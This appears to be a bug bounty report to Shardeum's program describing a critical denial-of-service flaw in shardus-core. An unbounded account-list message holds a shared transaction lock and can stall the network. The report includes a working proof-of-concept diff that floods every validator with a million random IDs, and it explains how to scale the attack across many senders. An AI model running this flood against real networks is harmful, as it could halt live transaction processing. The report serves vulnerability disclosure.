# 33086 - \[BC - Critical] Complete shutdown of the transaction processing...

Submitted on Jul 11th 2024 at 04:13:20 UTC by @doxtopzhivago for [Boost | Shardeum: Core](https://immunefi.com/bounty/shardeum-core-boost/)

Report ID: #33086

Report type: Blockchain/DLT

Report severity: Critical

Target: <https://github.com/shardeum/shardus-core/tree/dev>

Impacts:

* Network not being able to confirm new transactions (total network shutdown)

## Description

## Brief/Intro

The handler of the internal message 'binary/get\_account\_data\_by\_list' can cause transaction processing queue blocking because of the sharing the same locking mechanism.

## Vulnerability Details

1. The handler of the internal message 'binary/get\_account\_data\_by\_list' is not setting correct bounds for length of the accounts list (Actually it is 2^32).
2. For each account the handler is executing app.getAccountDataByList which is calling AccountStorage.getAccount -> getAccountEntry -> creates and runs SQL query for each account ID.
3. Also the handler is creating fifoLock('accountModification') which is used in the following functions: preApplyTransaction and commitConsensedTransaction. Which are two critical functions for transaction processing. If this fifoLock is occupied by this handler, transaction processing will be slowed down or even stopped.

So by sending a big list (2^32) of random accounts it can create a significant delay in transaction processing on the single node.

It also can be scaled so that whole network performance will fall down:

For incomming messages there is no check that remote IP address belongs to the node, only verification by signature. So private key from single standby node can be used by multiple senders.

In case of mass sending from multiple senders to all validators (list is open) attacker can completely stop transaction processing or significantly slow it down because the fifoLock is shared between transaction processing flow and the handler.

In my experiment it was causing onProcesssingQueueStuck and node became offline.

## Impact Details

I want to emphasize that it is not just a simple DOS, it is overloading bottleneck (fifoLock) which is also used in some critical functions in a system. By increasing number of accounts in a message you can impact transaction processing on target nodes or the whole network itself.

## Proof of Concept

Please use it only for the attacker node which should be connected to the network and be active:

diff --git a/src/shardus/index.ts b/src/shardus/index.ts index 06184f15..71968a30 100644 --- a/src/shardus/index.ts +++ b/src/shardus/index.ts @@ -85,6 +85,13 @@ import SocketIO from 'socket.io' import { nodeListFromStates, queueFinishedSyncingRequest } from '../p2p/Join' import \* as NodeList from '../p2p/NodeList' import { P2P } from '@shardus/types' +import { GetAccountDataByListReq, serializeGetAccountDataByListReq } from '../types/GetAccountDataByListReq' +import {

* deserializeGetAccountDataByListResp,
* GetAccountDataByListResp, +} from '../types/GetAccountDataByListResp' +import \* as hackcrypto from 'crypto' +const { Buffer } = require('buffer');

// the following can be removed now since we are not using the old p2p code @@ -725,7 +735,40 @@ class Shardus extends EventEmitter { this.stateManager.startProcessingCycleSummaries() }) Self.emitter.on('active', (nodeId) => {

* ```
   // this.io.emit('DATA', `NODE ACTIVE ${nodeId}`)
  ```
* ```
   console.log("n00b We are in active", NodeList.othersByIdOrder)            
  ```
* ```
   const garbageIds = [];
  ```
* ```
   if (NodeList.othersByIdOrder && NodeList.othersByIdOrder.length > 0 ){
  ```
* ```
     for (let i = 0; i < 1000000; i++) {
  ```
* ```
       garbageIds.push(hackcrypto.randomBytes(32).toString('hex'));
  ```
* ```
     }
  ```
* ```
     const message = { accountIds: garbageIds }
  ```
* ```
     setTimeout(async () => {
  ```
* ```
       try {
  ```
* ```
         const results = await Promise.all(NodeList.activeByIdOrder.map(node => {
  ```
* ```
           if (node.id !== Self.id) {
  ```
* ```
             this.p2p.askBinary<GetAccountDataByListReq, GetAccountDataByListResp>(
  ```
* ```
               node,
  ```
* ```
               InternalRouteEnum.binary_get_account_data_by_list,
  ```
* ```
               message,
  ```
* ```
               serializeGetAccountDataByListReq,
  ```
* ```
               deserializeGetAccountDataByListResp,
  ```
* ```
               {}, '', false, 10000
  ```
* ```
             )
  ```
* ```
           }            
  ```
* ```
        }));
  ```
* ```
       } catch (error) {
  ```
* ```
         console.error('Error:', error);
  ```
* ```
       }
  ```
* ```
     }, 10000);
  ```
* ```
   }    
  ```
